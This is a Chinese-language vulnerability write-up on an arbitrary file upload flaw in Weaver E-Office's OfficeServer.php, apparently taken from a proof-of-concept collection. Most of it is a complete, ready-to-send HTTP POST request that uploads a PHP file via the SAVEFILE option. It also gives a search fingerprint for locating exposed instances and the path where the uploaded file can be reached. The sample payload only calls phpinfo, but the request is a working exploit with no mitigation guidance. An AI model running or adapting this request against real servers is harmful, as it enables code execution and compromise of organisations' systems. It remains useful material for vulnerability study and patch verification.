# 泛微OA E-Office OfficeServer.php 任意文件上传漏洞

## 漏洞描述

泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息

## 漏洞影响

```
泛微OA E-Office
```

## 网络测绘

```
"eoffice10"
```

## 漏洞复现

登录页面

![image-20221008102546649](images/202210081025897.png)

验证POC

```
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 990
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name="FileData";filename="test.php"
Content-Type: application/octet-stream

<?php
phpinfo();
?>

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name="FormData"

{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
------WebKitFormBoundaryLpoiBFy4ANA8daew--
```

![image-20221008102607520](images/202210081026579.png)

文件上传位置

```
/eoffice10/server/public/iWebOffice2015/Document/test.php
```

![image-20221008102621829](images/202210081026917.png)